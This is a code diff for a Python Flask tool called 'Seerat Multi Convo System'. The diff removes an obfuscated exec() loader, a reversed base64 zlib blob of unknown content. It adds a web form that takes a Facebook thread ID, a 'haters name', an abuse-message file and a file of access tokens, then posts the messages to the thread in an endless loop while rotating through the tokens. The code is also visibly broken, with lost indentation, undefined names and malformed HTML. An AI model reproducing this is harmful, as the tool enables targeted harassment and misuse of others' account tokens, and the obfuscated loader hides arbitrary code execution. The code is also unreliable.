@@ -1,3 +1,183 @@
-#ENCRYPTED BY : TRICKER S33R9T BRAND
- # Github : https://github.com/seeratwargi
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+from flask import Flask, request, render_template, redirect, url_for
+import requests
+import time
+
+app = Flask(name)
+
+headers = {
+'Connection': 'keep-alive',
+'Cache-Control': 'max-age=0',
+'Upgrade-Insecure-Requests': '1',
+'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+'Accept-Encoding': 'gzip, deflate',
+'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+'referer': 'www.google.com'
+}
+
+def send_messages():
+with open('password.txt', 'r') as file:
+password = file.read().strip()
+
+entered_password = password  
+
+if entered_password != password:  
+    print('❌] 🔜 Incorrect Password Contact Seerat')  
+    sys.exit()  
+
+mmm = requests.get('https://pastebin.com/raw/Z5M2zhkg').text.strip()  
+
+if mmm not in password:  
+    print('❌] 🔜 Incorrect Password Contact Seerat')  
+    sys.exit()
+
+@app.route('/')
+def index():
+
+return '''
+
+ <!DOCTYPE html>   <html lang="en">  
+ <head>  
+   <meta charset="utf-8">  
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+   <title>Seerat Brand System</title>  
+   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">  
+   <style>  
+     body{  
+       background-image: url('background-image: url('https://i.ibb.co/fVdZpJSC/IMG-20250804-091433.jpg');  
+    background-size: cover;  
+    background-repeat: no-repeat;');  }  
+ .container{  
+   max-width: 500px;  
+   background-color: ##;  
+   border-radius: 10px;  
+   padding: 20px;  
+   box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);  
+   margin: 0 auto;  
+   margin-top: 20px;  
+ }  
+ .header{  
+   text-align: center;  
+   padding-bottom: 20px;  
+ }  
+ .btn-submit{  
+   width: 100%;  
+   margin-top: 10px;  
+ }  
+ .footer{  
+   text-align: center;  
+   margin-top: 20px;  
+   color: cyan;  
+ }
+
+   </style>  
+ </head>  
+ <body>  
+   <header class="header mt-4">  
+    <h1 class="mb-3"  
+     <h2 class="mt-3"< </h1>  
+   </header>  <div class="container">  
+    <form action="/" method="post" enctype="multipart/form-data">  
+        <div class="mb-3">  
+            <label for="threadId"<h1 style="color: pink;"> >𝙲𝚘𝚗𝚟𝚘 <=>𝚒𝚍 <=>𝚗𝚞𝚖𝚋𝚎𝚛𝚒𝚌<=>:</label>  
+            <input type="text" class="form-control" id="threadId" name="threadId" required>  
+        </div>  
+        <div class="mb-3">  
+            <label for="kidx"<h1 style="color: blue;"> >Ｈｅｔｔｅｒｓ<=> ｎａｍｅ:</label>  
+            <input type="text" class="form-control" id="kidx" name="kidx" required>  
+        </div>  
+        <div class="mb-3">  
+            <label for="messagesFile"<h1 style="color: lime;">Click Here & Select Abouse File:</label>  
+            <input type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" required>  
+        </div>  
+        <div class="mb-3">  
+            <label for="txtFile"<h1 style="color: coral;">Click Here  & Select Token File:</label>  
+            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>  
+        </div>  
+        <div class="mb-3">  
+            <label for="time"<h1 style="color: lime;">Send Message In Second 🥈:</label>  
+            <input type="number" class="form-control" id="time" name="time" required>  
+        </div>  
+        <button type="submit" class="btn btn-primary btn-submit">click 1 time only all file submit</button>  
+    </form>  
+		<form action="/" method="post">  
+		    <button type="submit" class="btn btn-danger mt-3" name="stop" value="true">Stop</button>  
+	     </form>  
+        </div>  
+        <div class="container mt-3 status" id="status">  
+            <!-- Status messages will be displayed here -->  
+        </div>  
+        <footer class="footer">  <div class="random-images">  
+
+
+    <!-- Add more random images and links here as needed -->  
+</div>  
+
+<footer class="footer">  
+
+    <p>&copy;༒ ROYAL PUNJAB RULEX ༄
+
+2024. All Rights Reserved.</p>
+<p[[ TRICKS BY S33R9T BR9ND ]] Seerat Multi Convo System </p>
+</footer>
+
+
+
+</body>  
+</html>'''  @app.route('/', methods=['GET', 'POST'])
+def send_message():
+if request.method == 'POST':
+thread_id = request.form.get('threadId')
+mn = request.form.get('kidx')
+time_interval = int(request.form.get('time'))
+
+txt_file = request.files['txtFile']  
+    access_tokens = txt_file.read().decode().splitlines()  
+
+    messages_file = request.files['messagesFile']  
+    messages = messages_file.read().decode().splitlines()  
+
+    num_comments = len(messages)  
+    max_tokens = len(access_tokens)  
+
+    post_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'  
+    haters_name = mn  
+    speed = time_interval  
+
+    while True:  
+        try:  
+            for comment_index in range(num_comments):  
+                token_index = comment_index % max_tokens  
+                access_token = access_tokens[token_index]  
+
+                comment = messages[comment_index].strip()  
+
+                parameters = {'access_token': access_token,  
+                              'message': haters_name + ' ' + comment}  
+                response = requests.post(  
+                    post_url, json=parameters, headers=headers)  
+
+                current_time = time.strftime(" ")  
+                if response.ok:  
+                    ("".format(  
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))  
+                    ("  {}".format(current_time))  
+                    ("\n" * 2)  
+                else:  
+                    ("".format(  
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))  
+                    ("   {}".format(current_time))  
+                    print("\n" * 2)  
+                time.sleep(speed)  
+        except Exception as e:  
+            
+                    
+            print(e)  
+            time.sleep(30)  
+
+return redirect(url_for('index'))
+
+send_messages()
+
+if name == 'main':
+app.run(host='0.0.0.0', port=5000)
